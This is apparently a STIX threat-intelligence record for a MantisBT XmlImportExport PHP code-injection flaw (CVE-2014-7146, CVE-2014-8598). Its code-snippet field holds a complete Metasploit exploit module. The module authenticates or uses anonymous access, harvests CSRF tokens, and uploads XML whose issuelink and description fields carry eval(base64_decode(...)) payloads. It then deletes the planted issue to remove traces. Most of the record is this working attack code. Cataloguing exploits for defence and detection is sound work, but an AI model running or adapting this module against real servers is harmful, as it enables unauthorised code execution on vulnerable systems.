{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--46ea4555-0f00-4573-8880-b70ad513b0ba",
    "created": "2024-08-14T17:10:00.77183Z",
    "modified": "2024-08-14T17:10:00.771834Z",
    "name": "MantisBT XmlImportExport Plugin PHP Code Injection Vulnerability",
    "description": " This module exploits a post-auth vulnerability found in MantisBT versions 1.2.0a3 up to 1.2.17 when the Import/Export plugin is installed. The vulnerable code exists on plugins/XmlImportExport/ImportXml.php, which receives user input through the \"description\" field and the \"issuelink\" attribute of an uploaded XML file and passes to preg_replace() function with the /e modifier. This allows a remote authenticated attacker to execute arbitrary PHP code on the remote machine. This version also suffers from another issue. The import page is not checking the correct user level of the user, so it's possible to exploit this issue with any user including the anonymous one if enabled.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/mantisbt_php_exec.rb",
            "external_id": "mantisbt_php_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-7146"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-8598"
        },
        {
            "source_name": "reference",
            "url": "https://www.mantisbt.org/bugs/view.php?id=17725"
        },
        {
            "source_name": "reference",
            "url": "https://www.mantisbt.org/bugs/view.php?id=17780"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include REXML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'MantisBT XmlImportExport Plugin PHP Code Injection Vulnerability',\n      'Description'    => %q{\n        This module exploits a post-auth vulnerability found in MantisBT versions 1.2.0a3 up to 1.2.17 when the Import/Export plugin is installed.\n        The vulnerable code exists on plugins/XmlImportExport/ImportXml.php, which receives user input through the \"description\" field and the \"issuelink\" attribute of an uploaded XML file and passes to preg_replace() function with the /e modifier.\n        This allows a remote authenticated attacker to execute arbitrary PHP code on the remote machine.\n        This version also suffers from another issue. The import page is not checking the correct user level\n        of the user, so it's possible to exploit this issue with any user including the anonymous one if enabled.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Egidio Romano', # discovery http://karmainsecurity.com\n          'Juan Escobar <eng.jescobar[at]gmail.com>', # module development @itsecurityco\n          'Christian Mehlmauer'\n        ],\n      'References'     =>\n        [\n          ['CVE', '2014-7146'],\n          ['CVE', '2014-8598'],\n          ['URL', 'https://www.mantisbt.org/bugs/view.php?id=17725'],\n          ['URL', 'https://www.mantisbt.org/bugs/view.php?id=17780']\n        ],\n      'Platform'       => 'php',\n      'Arch'           => ARCH_PHP,\n      'Targets'        => [['Generic (PHP Payload)', {}]],\n      'DisclosureDate' => '2014-11-08',\n      'DefaultTarget'  => 0))\n\n      register_options(\n      [\n        OptString.new('USERNAME', [ true, 'Username to authenticate as', 'administrator']),\n        OptString.new('PASSWORD', [ true, 'Pasword to authenticate as', 'root']),\n        OptString.new('TARGETURI', [ true, 'Base directory path', '/'])\n      ])\n  end\n\n  def get_mantis_version\n    xml = Document.new\n    xml.add_element(\n    \"soapenv:Envelope\",\n    {\n      'xmlns:xsi'     => \"http://www.w3.org/2001/XMLSchema-instance\",\n      'xmlns:xsd'     => \"http://www.w3.org/2001/XMLSchema\",\n      'xmlns:soapenv' => \"http://schemas.xmlsoap.org/soap/envelope/\",\n      'xmlns:man'     => \"http://futureware.biz/mantisconnect\"\n    })\n    xml.root.add_element(\"soapenv:Header\")\n    xml.root.add_element(\"soapenv:Body\")\n    body = xml.root.elements[2]\n    body.add_element(\"man:mc_version\",\n      { 'soapenv:encodingStyle' => \"http://schemas.xmlsoap.org/soap/encoding/\" }\n    )\n\n    res = send_request_cgi({\n      'method'   => 'POST',\n      'uri'      => normalize_uri(target_uri.path, 'api', 'soap', 'mantisconnect.php'),\n      'ctype'    => 'text/xml; charset=UTF-8',\n      'headers'  => { 'SOAPAction' => 'http://www.mantisbt.org/bugs/api/soap/mantisconnect.php/mc_version'},\n      'data'     => xml.to_s\n    })\n    if res && res.code == 200\n      match = res.body.match(/<ns1:mc_versionResponse.*><return xsi:type=\"xsd:string\">(.+)<\\/return><\\/ns1:mc_versionResponse>/)\n      if match && match.length == 2\n        version = match[1]\n        print_status(\"Detected Mantis version #{version}\")\n        return version\n      end\n    end\n\n    print_status(\"Can not detect Mantis version\")\n    return nil\n  end\n\n  def check\n    version = get_mantis_version\n\n    return Exploit::CheckCode::Unknown if version.nil?\n\n    gem_version = Rex::Version.new(version)\n    gem_version_introduced = Rex::Version.new('1.2.0a3')\n    gem_version_fixed = Rex::Version.new('1.2.18')\n\n    if gem_version < gem_version_fixed && gem_version >= gem_version_introduced\n      return Msf::Exploit::CheckCode::Appears\n    else\n      return Msf::Exploit::CheckCode::Safe\n    end\n  end\n\n  def do_login()\n    # check for anonymous login\n    res = send_request_cgi({\n      'method'   => 'GET',\n      'uri'      => normalize_uri(target_uri.path, 'login_anon.php')\n    })\n    # if the redirect contains a username (non empty), anonymous access is enabled\n    if res && res.redirect? && res.redirection && res.redirection.query =~ /username=[^&]+/\n      print_status('Anonymous access enabled, no need to log in')\n      session_cookie = res.get_cookies\n    else\n      res = send_request_cgi({\n        'method'   => 'GET',\n        'uri'      => normalize_uri(target_uri.path, 'login_page.php'),\n        'vars_get' => {\n          'return'  => normalize_uri(target_uri.path, 'plugin.php?page=XmlImportExport/import')\n        }\n      })\n      session_cookie = res.get_cookies\n      print_status('Logging in...')\n      res = send_request_cgi({\n        'method'    => 'POST',\n        'uri'       => normalize_uri(target_uri.path, 'login.php'),\n        'cookie'    => session_cookie,\n        'vars_post' => {\n          'return'  => normalize_uri(target_uri.path, 'plugin.php?page=XmlImportExport/import'),\n          'username' => datastore['username'],\n          'password' => datastore['password'],\n          'secure_session' => 'on'\n        }\n      })\n      fail_with(Failure::NoAccess, 'Login failed') unless res && res.code == 302\n\n      fail_with(Failure::NoAccess, 'Wrong credentials') unless res && !res.redirection.to_s.include?('login_page.php')\n\n      session_cookie = \"#{session_cookie} #{res.get_cookies}\"\n    end\n\n    session_cookie\n  end\n\n  def upload_xml(payload_b64, rand_text, cookies, is_check)\n\n    if is_check\n      timeout = 20\n    else\n      timeout = 3\n    end\n\n    rand_num = Rex::Text.rand_text_numeric(1, 9)\n\n    print_status('Checking XmlImportExport plugin...')\n    res = send_request_cgi({\n      'method'   => 'GET',\n      'uri'      => normalize_uri(target_uri.path, 'plugin.php'),\n      'cookie'   => cookies,\n      'vars_get' => {\n        'page' => 'XmlImportExport/import'\n      }\n    })\n\n    unless res && res.code == 200 && res.body\n      print_error('Error trying to access XmlImportExport/import page...')\n      return false\n    end\n\n    if res.body.include?('Plugin is not registered with MantisBT')\n      print_error('XMLImportExport plugin is not installed')\n      return false\n    end\n\n    # Retrieving CSRF token\n    if res.body =~ /name=\"plugin_xml_import_action_token\" value=\"(.*)\"/\n      csrf_token = Regexp.last_match[1]\n    else\n      print_error('Error trying to read CSRF token')\n      return false\n    end\n\n    # Retrieving default project id\n    if res.body =~ /name=\"project_id\" value=\"([0-9]+)\"/\n      project_id = Regexp.last_match[1]\n    else\n      print_error('Error trying to read project id')\n      return false\n    end\n\n    # Retrieving default category id\n    if res.body =~ /name=\"defaultcategory\">[.|\\r|\\r\\n]*<option value=\"([0-9])\" selected=\"selected\" >\\(select\\)<\\/option><option value=\"1\">\\[All Projects\\] (.*)<\\/option>/\n      category_id = Regexp.last_match[1]\n      category_name = Regexp.last_match[2]\n    else\n      print_error('Error trying to read default category')\n      return false\n    end\n\n    # Retrieving default max file size\n    if res.body =~ /name=\"max_file_size\" value=\"([0-9]+)\"/\n      max_file_size = Regexp.last_match[1]\n    else\n      print_error('Error trying to read default max file size')\n      return false\n    end\n\n    # Retrieving default step\n    if res.body =~ /name=\"step\" value=\"([0-9]+)\"/\n      step = Regexp.last_match[1]\n    else\n      print_error('Error trying to read default step value')\n      return false\n    end\n\n    xml_file =   %Q|\n    <mantis version=\"1.2.17\" urlbase=\"http://localhost/\" issuelink=\"${eval(base64_decode(#{ payload_b64 }))}}\" notelink=\"~\" format=\"1\">\n        <issue>\n            <id>#{ rand_num }</id>\n            <project id=\"#{ project_id }\">#{ rand_text }</project>\n            <reporter id=\"#{ rand_num }\">#{ rand_text }</reporter>\n            <priority id=\"30\">normal</priority>\n            <severity id=\"50\">minor</severity>\n            <reproducibility id=\"70\">have not tried</reproducibility>\n            <status id=\"#{ rand_num }\">new</status>\n            <resolution id=\"#{ rand_num }\">open</resolution>\n            <projection id=\"#{ rand_num }\">none</projection>\n            <category id=\"#{ category_id }\">#{ category_name }</category>\n            <date_submitted>1415492267</date_submitted>\n            <last_updated>1415507582</last_updated>\n            <eta id=\"#{ rand_num }\">none</eta>\n            <view_state id=\"#{ rand_num }\">public</view_state>\n            <summary>#{ rand_text }</summary>\n            <due_date>1</due_date>\n            <description>{${eval(base64_decode(#{ payload_b64 }))}}1</description>\n        </issue>\n    </mantis>\n    |\n\n    data = Rex::MIME::Message.new\n    data.add_part(\"#{ csrf_token }\", nil, nil, \"form-data; name=\\\"plugin_xml_import_action_token\\\"\")\n    data.add_part(\"#{ project_id }\", nil, nil, \"form-data; name=\\\"project_id\\\"\")\n    data.add_part(\"#{ max_file_size }\", nil, nil, \"form-data; name=\\\"max_file_size\\\"\")\n    data.add_part(\"#{ step }\", nil, nil, \"form-data; name=\\\"step\\\"\")\n    data.add_part(xml_file, \"text/xml\", \"UTF-8\", \"form-data; name=\\\"file\\\"; filename=\\\"#{ rand_text }.xml\\\"\")\n    data.add_part(\"renumber\", nil, nil, \"form-data; name=\\\"strategy\\\"\")\n    data.add_part(\"link\", nil, nil, \"form-data; name=\\\"fallback\\\"\")\n    data.add_part(\"on\", nil, nil, \"form-data; name=\\\"keepcategory\\\"\")\n    data.add_part(\"#{ category_id }\", nil, nil, \"form-data; name=\\\"defaultcategory\\\"\")\n    data_post = data.to_s\n\n    print_status('Sending payload...')\n    res = send_request_cgi({\n      'method'  => 'POST',\n      'uri'     => normalize_uri(target_uri.path, 'plugin.php?page=XmlImportExport/import_action'),\n      'cookie' => cookies,\n      'ctype'   => \"multipart/form-data; boundary=#{ data.bound }\",\n      'data'    => data_post\n    }, timeout)\n\n    if res && res.body && res.body.include?('APPLICATION ERROR')\n      print_error('Error on uploading XML')\n      return false\n    end\n\n    # request above will time out and return nil on success\n    return true\n  end\n\n  def exec_php(php_code, is_check = false)\n    print_status('Checking access to MantisBT...')\n    res = send_request_cgi({\n      'method'   => 'GET',\n      'uri'      => normalize_uri(target_uri.path)\n    })\n\n    fail_with(Failure::NoAccess, 'Error accessing MantisBT') unless res && (res.code == 200 || res.redirection)\n\n    # remove comments, line breaks and spaces of php_code\n    payload_clean = php_code.gsub(/(\\s+)|(#.*)/, '')\n\n    # clean b64 payload\n    while Rex::Text.encode_base64(payload_clean).include?('=')\n      payload_clean = \"#{ payload_clean } \"\n    end\n    payload_b64 = Rex::Text.encode_base64(payload_clean)\n\n    rand_text = Rex::Text.rand_text_alpha(5, 8)\n\n    cookies = do_login()\n\n    res_payload = upload_xml(payload_b64, rand_text, cookies, is_check)\n\n    return unless res_payload\n\n    # When a meterpreter session is active, communication with the application is lost.\n    # Must login again in order to recover the communication. Thanks to @FireFart for figure out how to fix it.\n    cookies = do_login()\n\n    print_status(\"Deleting issue (#{ rand_text })...\")\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => normalize_uri(target_uri.path, 'my_view_page.php'),\n      'cookie' => cookies\n    })\n\n    unless res && res.code == 200\n      print_error('Error trying to access My View page')\n      return false\n    end\n\n    if res.body =~ /title=\"\\[@[0-9]+@\\] #{ rand_text }\">0+([0-9]+)<\\/a>/\n      issue_id = Regexp.last_match[1]\n     else\n      print_error('Error trying to retrieve issue id')\n      return false\n    end\n\n    res = send_request_cgi({\n      'method'   => 'GET',\n      'uri'      => normalize_uri(target_uri.path, 'bug_actiongroup_page.php'),\n      'cookie'   => cookies,\n      'vars_get' => {\n        'bug_arr[]' => issue_id,\n        'action' => 'DELETE',\n      },\n    })\n\n    if res && res.body =~ /name=\"bug_actiongroup_DELETE_token\" value=\"(.*)\"\\/>/\n      csrf_token = Regexp.last_match[1]\n    else\n      print_error('Error trying to retrieve CSRF token')\n      return false\n    end\n\n    res = send_request_cgi({\n      'method'   => 'POST',\n      'uri'      => normalize_uri(target_uri.path, 'bug_actiongroup.php'),\n      'cookie'   => cookies,\n      'vars_post' => {\n        'bug_actiongroup_DELETE_token' => csrf_token,\n        'bug_arr[]' => issue_id,\n        'action' => 'DELETE',\n      },\n    })\n\n    if res && res.code == 302 || res.body !~ /Issue #{ issue_id } not found/\n      print_status(\"Issue number (#{ issue_id }) removed\")\n    else\n      print_error(\"Removing issue number (#{ issue_id }) has failed\")\n      return false\n    end\n\n    # if check return the response\n    if is_check\n      return res_payload\n    else\n      return true\n    end\n  end\n\n  def exploit\n    get_mantis_version\n    unless exec_php(payload.encoded)\n      fail_with(Failure::Unknown, 'Exploit failed, aborting.')\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-11-08",
    "x_mitre_platforms": [
        "php'"
    ]
}